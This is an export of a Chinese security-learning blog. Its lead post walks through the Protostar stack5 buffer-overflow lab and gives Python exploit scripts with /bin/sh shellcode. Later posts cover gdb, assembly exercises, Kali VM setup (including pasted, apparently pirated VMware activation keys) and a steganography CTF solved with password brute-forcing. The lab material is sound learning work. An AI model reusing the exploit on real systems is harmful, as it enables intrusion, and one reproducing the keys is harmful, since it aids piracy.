    <content type="text"><![CDATA[本篇博文是关于shellcode的学习，视频前前后后看了十几遍，里面的步骤也跟着做了十几遍，总算是有点眉目了。 学习需要用到的protostar在视频里面有链接，这里就不贴出来了。 视频链接：http://liveoverflow.com/binary_hacking/ 题目 Protostar Stack5AboutStack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints At this point in time, it might be easier to use someone elses shellcode if debugging the shellcode, use\xcc (int3) to stop the program executing and return to the debugger remove the int3s once your shellcode is done. 123456789#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char buffer[64]; gets(buffer);&#125; 分析首先看源码，很短，就一个gets。放到gdb里面看一下 首先要弄清楚绿框内的东西是什么意思，这被称为Calling Convention(函数调用约定)，也就是说下面call所调用的gets函数的参数要从绿框所指定的地址里面获取，也就是esp+0x10这个地址，被mov DWORD PTR [esp],eax 放在了栈顶的位置。 先在程序开始的地方下个断点，查看栈可以知道此时esp所指向的内容就是ret将要返回的地址(蓝框)，记下此时的esp的值：0xbffff7bc，于是我们期望利用gets的溢出将这个返回的地址覆盖成我们想要的地址，这样才能执行shellcode，选哪个地址好呢，其实都无所谓，可以直接选在蓝框后面，也就是红框(0xbffff7c0)，这样理论上就可以ret到栈里(黄箭头)来执行shellcode了。 接下来继续单步执行到call命令之前 从刚才说的可以知道，绿框内的指令将gets所需要的参数的开始的地址放在了栈顶(红框)，因此蓝箭头所指就是字符串存放的位置。黄框就是刚刚记下的ret的地址，从蓝箭头到黄框有20*4字节，现在可以来写个脚本试试了。 12345import structpadding = "A"*4*19ret = struct.pack("I", 0xbffff7c0)payload = "\xcc"*4 #int3print padding + ret + payload 成功将ret地址覆盖！ 我们运行试试 得到的结果是Illegal instruction(非法指令)。什么意思呢？ 再用gdb看看 注意到栈地址不同，可是什么会导致这个差异呢？把整个栈打印出来看看 x/1000s $esp 可以看到，红色框部分内容是完全一样的，直到黄框内容发生了变化，PWD，也就是目前工作目录，由于PWD的不同，较长的PWD导致栈的内容相当于被往上挤了，于是在上面ret的地方导致栈地址错位，所以刚刚写的脚本就不能准确的跳转到ret后面的那个地址了。 所以。。这个地方需要一些neat trick 下面是思路:P 现在可以尝试添加shellcode来拿shell了 先找个shellcode：http://shell-storm.org/shellcode/ &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot; &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot; &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot; &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot; 然后直接扔到脚本里面就行了 123456import structpadding = "A"*4*19ret = struct.pack("I", 0xbffff7c0+32)nop = "\x90"*100payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"print padding + ret + nop + payload 然后我们尝试运行 成功拿到shell！！XD]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用gdb调试的基本方法]]></title>
    <url>%2F2018%2F09%2F11%2F%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[下面列出一些使用gdb调试经常会用的到的一些命令，一时健忘了想不起来还可以过来看看(￣ε (#￣)∑ (gdb) file &lt;文件名&gt; #加载被调试的可执行程序文件 (gdb) r(un) #运行被调试的程序。若中途遇到断点则暂停在断点处 (gdb) c(ontinue) #继续执行被调试程序，直至下一个断点或程序结束 (gdb) b(reakpoint) &lt;函数名&gt;/*&lt;地址名&gt;/&lt;行号&gt;#设置断点 (gdb) d(elete breakpoint) &lt;断点的编号&gt; #删除断点 (gdb) si/ni #都是执行一行汇编源代码，si会进入函数，ni不会。 这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。 (gdb) p(rint) &lt;变量名称&gt; #显示指定变量（临时变量或全局变量）的值 (gdb) help &lt;命令名称&gt; #GDB帮助命令，提供对GDB名种命令的解释说明 (gdb) i(nfo) #显示各类信息，具体内容查阅“help i” (gdb) q(uit) #退出gdb (gdb) (e)x(amine)/{COUNT}{FMT}{SIZE} {ADDRESS} #按照一定的格式打印内存地址处的数据 {COUNT}: 打印的数目，默认为1。 {FMT}: 打印的格式1，默认为上次使用的{FMT}: o(octal): 8进制整数 x(hex): 16进制整数 d(decimal): 10进制整数 u(unsigned decimal): 10进制非负整数 t(binary): 2进制整数 f(float): 浮点数 a(address): 输出相对于前面最近的符号的偏移 i(instruction): 输出地址处的汇编指令 c(char): 字符 s(string): c字符串(null-terminated string) z(hex, zero padded on the left): 见说明 {SIZE}: 打印的字节数目，默认为上次使用的{SIZE}: b(byte): 1个字节 h(halfword): 2个字节 w(word): 4个字节 g(giant, 8 bytes): 8个字节 {ADDRESS}: 目标地址 比如：(gdb) x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位， 3表示输出三个单位，u表示按无符号十进制显示。 最后顺便说一下编译c文件的命令 gcc （需要编译的c源文件名）-o (编译后的可执行文件名) 比如要把test.c编译成test，用gcc test.c -o test就可以了]]></content>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验8-分析一个奇怪的程序]]></title>
    <url>%2F2018%2F08%2F10%2F%E5%AE%9E%E9%AA%8C8-%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[来源：王爽《汇编语言》第九章 实验8 p187 学到jmp指令的时候发现这个实验8很有意思，分析完程序之后对jmp指令的理解会更深一点。 下面是题目 分析下面程序，在运行前思考：这个程序可以正确返回吗？ 运行后再思考：为什么是这种结果？ 通过这个程序加深对相关内容的理解。 123456789101112131415161718192021222324252627 assume cs:codesg codesg segment mov ax,4c00h int 21h start: mov ax,0 s: nop nop mov di,offset s mov si,offset s2 mov ax,cs:[si] mov cs:[di],axs0: jmp short ss1: mov ax,0 int 21h mov ax,0s2: jmp short s1 nopcodesg endsend start 一开始的思路是顺着代码一步一步走的，想着既然jmp short s1，那就直接从s1开始继续往下执行呗，遇到int 21h中断指令后就顺理成章的认为程序不能正确返回。保险起见，把代码编译运行之后，发现第二次运行到s处的时候(也就是执行jmp short s1)并没有直接跳转到s1处，而是往上跳到了mov ax,4c00h然后程序正常返回了。。惊呆了。。 翻了一下前面几页看到了之前没有特别在意的“jmp指令是根据位移进行跳转的”，然后就恍然大悟了。。 下图是解题的大致思路]]></content>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设置栈段时栈内数据改变]]></title>
    <url>%2F2018%2F08%2F07%2F%E8%AE%BE%E7%BD%AE%E6%A0%88%E6%AE%B5%E6%97%B6%E6%A0%88%E5%86%85%E6%95%B0%E6%8D%AE%E6%94%B9%E5%8F%98%2F</url>
    <content type="text"><![CDATA[最近学习汇编时遇到一个问题一直没能解决，现在先记录一下。 我遇到的问题和这个差不多http://tieba.baidu.com/p/1944917683 下面详细说一下 我在debug程序的时候想查看一下栈段的内容，结果发现栈里的数据和一开始设置的内容不一样，下面是程序代码 1234567891011121314151617181920212223242526272829 assume cs:code,ds:data,ss:stack data segmentdw 0123H,0456H,0789H,0ABCH,0DEFH,0CBAH,0987H data ends stack segmentdw 0,0,0,0,0,0,0,0 stack ends code segmentstart: mov ax,stack mov ss,ax mov sp,16 mov ax,data mov ds,ax push ds:[0] push ds:[2] mov ax,4c00H int 21H code ends end start 进入debug调试，这时查看内存的内容。红框对应数据段，蓝框对应栈段。这时数据段，栈段数据和设置的一样。 接着用t命令单步执行，当执行到mov ss,ax时，栈段内数据已经改变 其中0b3c=ss，0008=ip，0b3d=cs，0547还不知道是什么。 网上比较能让我明白的解释是 “debug里的－t是单步中断指令，每执行一条指令产生一个中断（其实是执行其他指令－打印，否则－t后你怎么会看到各寄存器的值），但是要进行现场保护，即把子函数要用到的寄存器全部进栈，所以出现了以上结果” 可是这样就有一些新的问题： 如果我不设置栈段，这些数据会存放到哪里？ 如果系统可以将这些数据存放到其他地方，那为什么还要占用我设置的栈段？难道说我手动设置的栈段优先级高一些吗。。。。 先挖个坑在这儿，等哪天了解清楚了再来填这个坑。。。]]></content>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali Linux虚拟机初始配置]]></title>
    <url>%2F2018%2F07%2F22%2Fkali-Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[弄了几天总算是把kali linux 的虚拟机的基本配置弄好了，对于我这个菜鸡来说感觉是期间能踩的坑都被我踩了一遍。配置各种东西的时候焦头烂额，弄完了成就感还是满满的。今天就写篇文章记录一下我期间遇到的各种坑还有各项参数是怎么配置的，防止我以后再要弄的时候又要在网上到处查资料。 好了，不说废话。 虚拟机一开始虚拟机这个地方就出了问题，因为在下载虚拟机的时候没注意看，本来应该下载VMware workstation，结果下成了VMware Player也就是VMware workstation的缩水版，而且很长一段时间都没发觉。就一直没有用到快照功能，每次配置文件出错了改不回去就只能重装系统，很难受。 顺便贴一点VMware workstation的激活密钥 CG54H-D8D0H-H8DHY-C6X7X-N2KG6 ZC3WK-AFXEK-488JP-A7MQX-XL8YF AC5XK-0ZD4H-088HP-9NQZV-ZG2R4 ZC5XK-A6E0M-080XQ-04ZZG-YF08D ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8 之后是kali linux的镜像，到官网上面去下载就行了，我用kali linux x64的版本一直不能安装vmtools，最后只好选择x86版本了。紧接着就是系统初始安装，网上也有很多教程，这里直接贴出来https://jingyan.baidu.com/article/380abd0a1d066a1d91192c5c.html VMware tools的安装被这东西折磨了许久…感觉要安装好也是要看人品的。第一次本来安装好了结果是在VMware player里面，无奈只好在VMware workstation里面再安一次。结果提示安装好了之后却没有任何作用，网上找了各种办法也没用，无奈只好重新安一遍虚拟机（忘了照快照了- -），下面再详细说一下安装vmtools的步骤和坑。 打开虚拟机后点击虚拟机，再点安装VMware tools，虚拟机里面就生成了一个文件 打开文件，VMware提示用tar解压VMwareTools-10.2.5-8068393.tar.gz文件这时如果直接使用命令tar xzvf VMwareTools-10.2.5-8068393.tar.gz就会出现如下错误 解决办法是将VMwareTools-10.2.5-8068393.tar.gz复制到 home 目录下进行解压，解压完成后会得到一个叫vmware-tools-distrib的文件夹 然后输入以下命令，出现提示一直按回车就可以安装VMware tools了（用tab补全就不用一个一个的敲了） 最后显示如下的话就说明安装完成了 如果这时VMware tools还不生效的话，用命令reboot重启一下应该就可以了 Kali源的配置以及更新配置源这一块照理来说应该是很简单的，就直接在网上复制粘贴就行了，可它就是硬生生的卡了我好久，说到底其实是不会用vim编辑器… 先把我用的源贴出来 #中科大源 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #清华大学源 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #阿里云源 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 用命令vim /etc/apt/sources.list打开配置源文件 然后参考vim编辑器的使用方法把上面的源复制到sources.list文件里面去 最后变成这样，再输入:wq（注意包括冒号）保存并退出 源设置完成后，就可以用以下命令来更新软件包了,更新过程比较久，耐心等就行了，遇到需要操作的提示直接按回车就行。 12345apt-get update #更新软件包资源列表(没有对系统真正更新)apt-get upgrade #更新所有已安装的软件包(真正更新系统)apt-get dist-upgrade #将系统升级到新版本 杂项由于kali linux没有打开终端的快捷键，不是很方便，所以到设置里面添加一个。我设置的快捷键和windows一样，也是win+R 名称随便取，gnome-terminal就是打开终端的命令，Super就是 win 键 输入法本以为输入法也是一个大坑，应该要弄很久，结果安装过程也是出奇的顺利(虽然还是遇到小坑了)，哈哈可能是老天爷见我踩这么多坑也看不过去了。我安装的是搜狗输入法，参考了这篇教程。 首先用apt-get install fcitx命令安装fcitx，再用apt-get install fcitx-libs-qt安装fcitx-libs-qt。然后到搜狗官网去下载对应的linux系统的输入法安装包，我当然下载32bit的。我第一次下载安装包的时候直接用linux系统进了官网下载安装包，结果是损坏的，根据那篇教程试了一下在物理机下载安装包再复制到虚拟机里面，就不会损坏文件了。 在用dpkg -i （软件包名称）遇到如下情况就直接输入提示里面的命令就行了，最后再运行一遍dpkg -i （软件包名称） 就安装成功了。重启后在应用程序里面搜索fcitx，进入fcitx配置，就可以看到搜狗输入法了(图里的broken前面少打一个短横线- -)]]></content>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku隐写2]]></title>
    <url>%2F2018%2F07%2F18%2Fbugku%E9%9A%90%E5%86%992%2F</url>
    <content type="text"><![CDATA[2018/7/22更新 关于这道题突然想起有几点要补充一下。 首先这道题的解题方法肯定不止一种，直接把图片扔进binwalk里面把包分离出来当然可以秒解。我这种方法算是最笨最没有效率的方法了，可是对于新手来讲要对题目有深刻的理解的话必须要从最繁琐最基本的方法开始做，而且更少不了一遍遍的尝试和失败。对解题的原理有大概清楚的认识之后再用工具就会更加得心应手。 最后说一下手动找包的几个困难点。 首先是要找到压缩包的特殊文件标识，这道题是因为用winhex打开然后碰巧看到了zip文件标识PK，加上之前做题的经验推测出内含压缩包的，说实话题还是要多做，不然看到解题需要的某个关键信息（比如文件标识）一点反应也没有的话，又要抱怨：这谁想得到啊？！如果运气不好没有碰巧注意到的话就只有慢慢去找，确实是要把眼睛看花的。不过还是那句话，多练嘛，熟悉之后直接用工具解题就没那么麻烦了。 题目点我 打开链接是一张图片 用winhex打开图片，注意到flag.rar，猜测图片内含rar压缩包。 又注意到zip压缩包特殊的头部和尾部标识，所以猜测图片可分解为zip压缩包。 用notepad++打开图片，查找PK(即zip文件头部或尾部标识) 下面解释一下zip文件的头尾标识 (此处新建一个zip文件作为对比↓) 头部固定以PK（即50 4B 03 04）作为开始，尾部以PK加上固定长度（一排多两个，即18个hex位）的标识位结束。 关于zip文件格式更详细的介绍 在winhex中找到标识位，删除PK之前的所有内容并保存，将修改后的文件后缀名由jpg改为zip，获得一个zip压缩包。 zip压缩包内容如下 下图是提示.jpg 打开flag.rar发现一个已加密的jpg图片，由上图可知密码为三位数字，于是用爆破工具：ARCHPR 爆破得到密码为871，输入后成功打开图片 用notepad++打开图片试试，拖到最后发现flag，括号内猜测为base64加密，解密后得到flag。 flag{y0u Are a h@cker!}]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
</search>
